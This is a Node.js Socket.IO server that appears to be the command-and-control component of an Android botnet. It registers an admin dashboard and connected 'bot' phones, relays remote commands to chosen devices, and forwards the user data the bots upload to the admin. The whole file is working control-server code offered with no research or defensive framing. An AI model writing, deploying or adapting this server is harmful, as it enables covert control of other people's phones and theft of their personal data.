var express = require('express');
var socket = require('socket.io');

var app = express();    //App Setup
app.use(express.static(__dirname + '/SClientSide/Dashboard')); //Static Files
var server = app.listen(80, function () {
    console.log('Listening to port 80');
});


//Socket setup
var io = socket(server);
io.on('connection', function (socket) {
    handleSocket(socket);
});


//Handle socket
var adminSocket;
var botSocketList = [];
var botDataList = [];

function handleSocket(socket) {

    //Register admin and save socket instance to global adminSocket variable
    socket.on('registerAdmin', function (data) {
        socket.tag = "admin";
        adminSocket = socket;
        console.log(data);
        console.log("A admin connected: " + socket.id);

        //Send bot connected + data to web client i.e., list of all connected devices
        adminSocket.emit('registerBotClient', {botDataList: botDataList});

        //Send command to device i.e., bot
        handleWebClientCommand(socket);
    });

    //To register a bot and send data to web client
    socket.on('registerBot', function (data) {
        console.log(data);
        socket.tag = data.uid;
        botSocketList.push(socket);
        botDataList.push(data);
        console.log("A bot connected: " + socket.id);

        //socket.emit('commands', [{command: 'openBrowser', arg1: "google.com"}]);

        //Send bot connected + data to web client i.e., list of all connected devices
        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('registerBotClient', {botDataList: botDataList});


        //Send bot data to web client when bot send any userdata
        handleUserData(socket);

    });

    //Fired up when any socket is disconnected
    socket.on('disconnect', function () {

        console.log(socket.tag + " disconnected");
        console.log(botDataList);

        for (var i = botDataList.length - 1; i >= 0; i--) {
            if (botDataList[i].uid === socket.tag) {
                botDataList.splice(i, 1);
            }
        }

        console.log(botDataList);
        console.log(botDataList.length);

        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('offlineBot', socket.tag);

    });
}


function handleWebClientCommand(socket) {

    //Send commands to bot i.e., android phone
    socket.on('commands', function (data) {
        for (var i = 0; i < botSocketList.length; i++) {
            if (botSocketList[i].tag === data.uid) {
                if (botSocketList[i] != null && botSocketList[i].connected) {
                    botSocketList[i].emit('commands', data.commands);
                    console.log('Command firing to bot server ' + data);
                } else {
                    console.log('Bot is not connected :-(');
                    /*if (adminSocket != null && adminSocket.connected) {
                        if (!botSocketList[i].connected)
                            adminSocket.emit('custom-error', {error: 'Sorry bot ' + data.uid + ' is offline :-('});
                        if (botSocketList[i] != null)
                            adminSocket.emit('custom-error', {error: 'Sorry bot ' + data.uid + ' is not connected :-('});
                    }*/
                }
            }
        }
    });
}

function handleUserData(socket) {

    //Receive and send data to web client from bot
    socket.on('usrData', function (data) {
        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('usrData', {data: data, uid: socket.tag});
        console.log('User data uploading');
    });

}
